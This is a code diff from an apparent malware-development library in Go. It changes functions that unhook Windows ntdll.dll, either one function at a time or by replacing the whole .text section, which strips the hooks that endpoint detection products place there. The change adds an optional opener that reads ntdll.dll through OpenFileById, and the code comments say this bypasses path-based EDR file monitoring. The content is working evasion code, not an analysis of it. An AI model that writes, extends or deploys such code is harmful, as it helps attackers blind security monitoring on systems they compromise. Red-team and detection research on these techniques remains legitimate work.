@@ -17,15 +17,32 @@ import (
 	"debug/pe"
 	"encoding/binary"
 	"fmt"
-	"os"
+	"io"
 	"path/filepath"
 	"unsafe"
 
 	"golang.org/x/sys/windows"
 
+	"github.com/oioio-space/maldev/evasion/stealthopen"
 	"github.com/oioio-space/maldev/win/api"
 	wsyscall "github.com/oioio-space/maldev/win/syscall"
 )
+
+// readNtdllBytes reads the clean on-disk ntdll.dll through opener. A nil
+// opener falls back to stealthopen.Standard (plain os.Open path read) —
+// identical to the pre-Opener behavior. Passing a *stealthopen.Stealth
+// built with NewStealth(ntdllPath) routes the read through OpenFileById
+// and bypasses path-based EDR file hooks.
+func readNtdllBytes(opener stealthopen.Opener) ([]byte, error) {
+	sysDir, _ := windows.GetSystemDirectory()
+	ntdllPath := filepath.Join(sysDir, "ntdll.dll")
+	f, err := stealthopen.Use(opener).Open(ntdllPath)
+	if err != nil {
+		return nil, fmt.Errorf("open ntdll.dll: %w", err)
+	}
+	defer f.Close()
+	return io.ReadAll(f)
+}
 
 // runtimeCriticalFuncs are ntdll functions called internally by the Go runtime
 // for file I/O and handle management. Patching these with INT3 or invalid bytes
@@ -53,18 +70,17 @@ var runtimeCriticalFuncs = map[string]bool{
 // these would deadlock: this function reads ntdll.dll from disk, which
 // calls these same functions via the Go runtime. Use FullUnhook instead
 // to restore all functions atomically.
-func ClassicUnhook(funcName string, caller *wsyscall.Caller) error {
+func ClassicUnhook(funcName string, caller *wsyscall.Caller, opener stealthopen.Opener) error {
 	if runtimeCriticalFuncs[funcName] {
 		return fmt.Errorf("refusing to unhook %s: Go runtime depends on it for file I/O (use FullUnhook instead)", funcName)
 	}
 
-	sysDir, _ := windows.GetSystemDirectory()
-	ntdllPath := filepath.Join(sysDir, "ntdll.dll")
-
-	// Read the clean ntdll from disk and parse as PE
-	rawBytes, err := os.ReadFile(ntdllPath)
+	// Read the clean ntdll from disk and parse as PE. Opener is optional;
+	// nil keeps the historic path-based read. A *stealthopen.Stealth
+	// built for ntdll.dll makes the open bypass path-based EDR hooks.
+	rawBytes, err := readNtdllBytes(opener)
 	if err != nil {
-		return fmt.Errorf("read ntdll.dll: %w", err)
+		return err
 	}
 
 	freshDLL, err := pe.NewFile(bytes.NewReader(rawBytes))
@@ -90,13 +106,15 @@ func ClassicUnhook(funcName string, caller *wsyscall.Caller) error {
 
 // FullUnhook replaces the entire .text section of the loaded ntdll.dll
 // with the clean version from disk. This removes ALL hooks at once.
-func FullUnhook(caller *wsyscall.Caller) error {
-	sysDir, _ := windows.GetSystemDirectory()
-	ntdllPath := filepath.Join(sysDir, "ntdll.dll")
-
-	rawBytes, err := os.ReadFile(ntdllPath)
+//
+// opener is optional: nil reads ntdll.dll via os.Open (historic path-based
+// read); passing a *stealthopen.Stealth built for ntdll.dll routes the
+// read through OpenFileById, bypassing path-based EDR file hooks that
+// specifically watch CreateFile on System32\ntdll.dll.
+func FullUnhook(caller *wsyscall.Caller, opener stealthopen.Opener) error {
+	rawBytes, err := readNtdllBytes(opener)
 	if err != nil {
-		return fmt.Errorf("read ntdll.dll: %w", err)
+		return err
 	}
 
 	freshDLL, err := pe.NewFile(bytes.NewReader(rawBytes))
